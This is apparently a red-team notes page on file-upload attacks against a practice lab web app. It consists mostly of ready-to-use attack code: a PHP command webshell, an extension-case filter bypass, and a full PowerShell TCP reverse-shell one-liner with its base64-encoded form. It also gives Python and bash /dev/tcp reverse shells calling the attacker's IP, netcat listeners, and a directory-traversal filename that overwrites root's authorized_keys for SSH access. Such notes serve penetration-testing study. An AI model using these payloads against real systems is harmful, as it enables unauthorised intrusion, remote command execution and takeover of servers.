---
title: FileUpload
parent: Attack Repository
grand_parent: Red Team
nav_order: 2
---
# 概要



---

# Example 1

## 通常のアップロード（ファイル種別の制限なし）又は拡張子の偽装

## Listing file types that can be uploaded
1. Check where files can be uploaded in the browser

2.  Create test files and verify which ones can and cannot be uploaded
```bash
echo “this is a test” > test.txt

# Normally, this file would cause an error upon upload
echo “<?php system($_GET[‘cmd’]);?>” > test.php
```

3.  Change the file extension to uppercase and attempt to upload
```bash
mv test.php test.pHP
```
4. If the upload is successful, you have bypassed the filter

---

# Example 2

## 拡張子の偽装

# Uploading a command execution file
1. Based on the results from Example 1, prepare a PHP file for a reverse shell and upload it
```bash
cp /usr/share/webshells/php/simple-backdoor.php ./
# Upload this file
```

2. Execute
```bash
curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
```

---

# Example 3

# Webshell
1. Select the target file extension (in this case .php, but it could also be .asp, etc.)
```bash
ls -la /usr/share/webshells
```
1. Prepare and upload the PHP file for the reverse shell based on the results from Example 1
```bash
cp /usr/share/webshells/php/simple-backdoor.php ./
# Upload this file
```

3. Prepare Netcat
```bash
nc -nlvp 4444
```

4. Execute the reverse shell using a PowerShell one-liner
```bash
# Launch PowerShell
pwsh
```


```powershell
# Creating a one-liner
$Text = '$client = New-Object System.Net.Sockets.TCPClient(“192.168.50.189”,4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + “PS ” + (pwd).Path + “> ”;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

$EncodedText = [Convert]::ToBase64String($Bytes)

$EncodedText

exit
```
5. Execution
```bash
# Append the Base64 string generated above to the following line and send it
# curl http://mountaindesserts.com/meteor/uploads/simple-backdoor.pHP?cmd=powrshell%20-enc%20

curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP? cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```

---

# Example 4

# If you can't use nc
# Overall Objective


An alternative method to establish a connection from the target to the attacker (192.168.49.57)
**to gain a shell (reverse shell)**.
# Why “When nc Cannot Be Used”

Common constraints:

* `nc` is not installed
* Functionality is limited in BusyBox
* The `-e` option is disabled (common recently)
* Easily detected by WAFs or EDRs

👉 Therefore,
**replace it with standard tools (Python / Bash)**

---

# Python 3 Version
```bash
python3 -c "import socket,os,pty;
s=socket.socket();
s.connect((‘192.168.49.57’,1234));
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)];
pty.spawn(‘/bin/sh’)"
```

### Processing Flow
1. `socket.socket()`
   → Create a TCP socket
2. `connect((‘192.168.49.57’,1234))`
   → Connects to the attacker's machine
3. `os.dup2()`
   → Redirects standard input/output to the socket
   * 0 = stdin
   * 1 = stdout
   * 2 = stderr
1. `pty.spawn(‘/bin/sh’)`
   → Shell with a pseudo-terminal (makes it easier to operate)

---

## URL Version (via Web Shell)

```bash
curl http://192.168.57.29:8089/.../simple-backdoor.php?cmd=python3 -c ‘...’
```

### Intent
* Inject a command into `simple-backdoor.php`
* Execute a Python reverse shell within it

👉 In other words
**RCE (Remote Code Execution) → Reverse Shell Escalation**

---

# Bash Version

```bash
bash -i >& /dev/tcp/192.168.49.57/443 0>&1
```

### Mechanism
* `/dev/tcp/host/port` → Bash’s pseudo-TCP functionality
* `>&` → Sends stdout/stderr
* `0>&1` → Also connects stdin

👉 Simple and requires no Python
👉 However, **limited to Bash versions where `/dev/tcp` is enabled**

---

# Practical Usage Comparison

| Method              | Requirements | Reliability |
| --------------- | --------- | --- |
| Python          | Python 3 required | High   |
| Bash (/dev/tcp) | Bash-compatible | Medium |
| nc              | Full functionality | High   |

---

# Notes (Attacker Preparation)

```bash
nc -lvnp 1234
```

Or
```bash
rlwrap nc -lvnp 1234
```

👉 This will not work without a recipient

---

# Using Non-Executable Files
# Overview
- Uploading files other than executable files (such as .php) can also cause serious damage
- Services like Google Drive allow the upload of executable files, but are designed so that those files do not affect the system

# Example: Intrusion Using an SSH Public Key
## Overview
Overwrite the target’s `authorized_keys` file and log in via SSH
## Procedure
1. Prepare your public key
```bash
# Generating a Public Key
kali@kali:~$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in fileup
Your public key has been saved in fileup.pub
...
# Write the public key to the authorized_keys file
kali@kali:~$ cat fileup.pub > authorized_keys
```

2. Upload the file
- Launch Burp and enable Intercept
- Upload the created authorized_keys file
![[../../../Assets/images/Pasted image 20260506014137.png
- Use directory traversal to send the intercepted communication
```bash
# Tamper with the “filename” part to create a directory traversal path
filename="../../../../../../../root/.ssh/authorized_keys"
```
![[../../../assets/images/Pasted image 20260506014204.png]]

3. Log in using the uploaded file
```
# Delete the SSH known_hosts file to avoid errors
 rm ~/.ssh/known_hosts

ssh -p 2222 -i fileup root@mountaindesserts.com
# On the target machine, sshd is listening on port 2222
```
